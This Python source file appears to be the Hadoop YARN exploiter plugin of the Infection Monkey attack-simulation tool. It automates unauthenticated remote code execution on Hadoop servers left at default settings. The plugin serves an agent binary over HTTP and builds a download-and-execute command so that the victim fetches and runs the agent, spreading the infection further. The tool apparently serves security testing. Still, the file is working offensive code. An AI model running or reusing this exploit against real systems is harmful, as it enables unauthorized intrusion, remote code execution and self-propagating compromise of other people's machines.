"""
    Remote code execution on HADOOP server with YARN and default settings
    Implementation is based on code from
    https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn
"""

import logging
from datetime import datetime
from typing import Any, Dict, Sequence
from uuid import UUID

# common imports
from common import OperatingSystem
from common.event_queue import IAgentEventPublisher
from common.types import Event

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import (
    HADOOP_LINUX_COMMAND,
    HADOOP_WINDOWS_COMMAND,
    MONKEY_ARG,
    TargetHost,
)
from infection_monkey.utils.commands import (
    DROPPER_TARGET_PATH_LINUX,
    DROPPER_TARGET_PATH_WIN64,
    build_monkey_commandline,
)

from .hadoop import Hadoop
from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)


class Plugin:
    _EXPLOITED_SERVICE = "Hadoop"

    def __init__(self):
        """
        :param monkey_target_paths: Where to upload the monkey at the target host system.
        Dict in format {'linux': '/tmp/monkey.sh', 'win64':... }
        """
        self.monkey_target_paths = {
            "linux": DROPPER_TARGET_PATH_LINUX,
            "windows": DROPPER_TARGET_PATH_WIN64,
        }
        self.vulnerable_urls = []
        self.exploit_info = {
            "display_name": self._EXPLOITED_SERVICE,
            "started": "",
            "finished": "",
            "vulnerable_urls": [],
            "vulnerable_ports": [],
            "executed_cmds": [],
        }
        self.exploit_attempts = []
        self.host = None
        self.exploit_result = ExploiterResultData()
        self.servers = []
        self.hadoop_exploit = None

    def run(
        self,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
    ) -> ExploiterResultData:
        self.host = host
        self.servers = servers
        self.current_depth = current_depth
        self.agent_binary_repository = agent_binary_repository

        self._options = HadoopOptions(**options)
        self.hadoop_exploit = Hadoop(
            host, self._options, interrupt, agent_id, agent_event_publisher
        )

        self._pre_exploit()
        try:
            return self._exploit_host()
        except Exception as e:
            logger.error("Exception in run", exc_info=True)
            raise e
        finally:
            self._post_exploit()

    def _pre_exploit(self):
        self.exploit_result = ExploiterResultData(
            os=self.host.operating_system, info=self.exploit_info
        )
        self.set_start_time()

    def _post_exploit(self):
        self.set_finish_time()

    def _exploit_host(self):
        # Try to get potential urls
        potential_urls = build_urls(
            str(self.host.ip), [(str(p), False) for p in self._options.target_ports]
        )
        if not potential_urls:
            self.exploit_result.error_message = (
                f"No potential exploitable urls has been found for {self.host}"
            )
            return self.exploit_result

        monkey_path_on_victim = get_agent_dst_path(self.host)

        http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, str(monkey_path_on_victim), self.agent_binary_repository
        )

        command = self._build_command(monkey_path_on_victim, http_path)
        try:
            for url in potential_urls:
                if self.hadoop_exploit.exploit(url, command):
                    self.add_executed_cmd(command)
                    self.exploit_result.exploitation_success = True
                    self.exploit_result.propagation_success = True
                    break
        finally:
            if self.exploit_result.exploitation_success:
                http_thread.join(self._options.agent_binary_download_timeout)
            http_thread.stop()

        return self.exploit_result

    def _build_command(self, path, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
        if OperatingSystem.WINDOWS == self.host.operating_system:
            base_command = HADOOP_WINDOWS_COMMAND
        else:
            base_command = HADOOP_LINUX_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    def set_start_time(self):
        self.exploit_info["started"] = datetime.now().isoformat()

    def set_finish_time(self):
        self.exploit_info["finished"] = datetime.now().isoformat()

    def add_vuln_url(self, url):
        self.exploit_info["vulnerable_urls"].append(url)

    def add_executed_cmd(self, cmd):
        """
        Appends command to exploiter's info.
        :param cmd: String of executed command. e.g. 'echo Example'
        """
        powershell = True if "powershell" in cmd.lower() else False
        self.exploit_info["executed_cmds"].append({"cmd": cmd, "powershell": powershell})
